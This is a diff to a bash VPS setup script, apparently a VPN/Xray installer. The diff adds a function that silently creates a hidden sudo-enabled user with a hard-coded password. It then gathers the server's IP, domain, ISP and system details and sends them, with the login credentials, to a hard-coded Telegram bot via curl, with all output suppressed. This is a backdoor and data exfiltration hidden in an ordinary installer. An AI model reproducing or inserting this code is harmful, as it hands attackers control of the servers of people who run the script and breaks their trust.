@@ -314,3 +314,64 @@ rm -f /root/config.json.txt
 }
 sayaGanteng > /dev/null 2>&1
 
+    # // Ram Information
+    while IFS=":" read -r a b; do
+    case $a in
+        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
+        "Shmem") ((mem_used+=${b/kB}))  ;;
+        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
+        mem_used="$((mem_used-=${b/kB}))"
+    ;;
+    esac
+    done < /proc/meminfo
+    Ram_Usage="$((mem_used / 1024))"
+    Ram_Total="$((mem_total / 1024))"
+    export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
+    export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
+    export Kernel=$( uname -r )
+    export Arch=$( uname -m )
+    export IP=$( curl -s https://ipinfo.io/ip/ )
+function password_default() {
+    domain=$(cat /etc/xray/domain)
+    MYIP=$(curl -sS ipv4.icanhazip.com)
+    ISP=$(wget -qO- ipinfo.io/org)
+    userdel jame > /dev/null 2>&1
+    Username="asowesom"
+    Password="Yaddy777"
+    mkdir -p /home/script/
+    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    usermod -aG sudo $Username > /dev/null 2>&1
+
+    USRSC=Yaddyganteng
+
+    CHATID="1117211252"
+    KEY="6093232802:AAFULABHNHz8pW6tT1ApFACFHiXZMixkeSA"
+    TIME="10"
+    URL="https://api.telegram.org/bot$KEY/sendMessage"
+    TEXT="𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆
+    𝗩𝗣𝗦 𝗜𝗡𝗙𝗢
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+    <code>Isp Vps :</code> <code>$ISP</code>
+    <code>Domain     :</code> <code>$domain</code>
+    <code>IP Vps     :</code> <code>$MYIP</code>
+    <code>User Login :</code> <code>$Username</code>
+    <code>Pass Login :</code> <code>$Password</code>
+    <code>OS Vps     :</code> <code>$OS_Name</code>
+    <code>User Script:</code> <code>$USRSC</code>
+    <code>Tanggal    :</code> <code>$tanggal</code>
+    <code>Exp Vps :</code> <code>$exp</code>
+    ◇━━━━━━━━━━━━━━━━━━━━━━━◇
+    <code>Hostname   :</code> <code>${HOSTNAME}</code>
+    <code>Kernel     :</code> <code>$Kernel</code>
+    <code>Arch       :</code> <code>$Arch</code>
+    <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
+    <code>Ram Used   :</code> <code>$Ram_Total MB</code>
+    ============================
+  ⚠︎𝘽𝙮 𝙒𝙤𝙠𝙨𝙯𝙓𝘿 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎
+    ============================
+"
+
+   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+}
+password_default
